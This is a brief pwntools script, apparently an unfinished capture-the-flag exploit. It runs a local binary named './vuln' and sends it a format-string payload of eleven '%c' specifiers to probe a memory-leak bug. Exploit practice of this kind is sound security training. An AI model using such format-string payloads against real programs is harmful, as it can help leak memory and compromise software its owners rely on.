from pwn import *

elf = context.binary = ELF('./vuln')
context.log_level = 'debug'

p = process()

p.sendline(b'1')
p.sendline(b'%c' * 11 + b'')
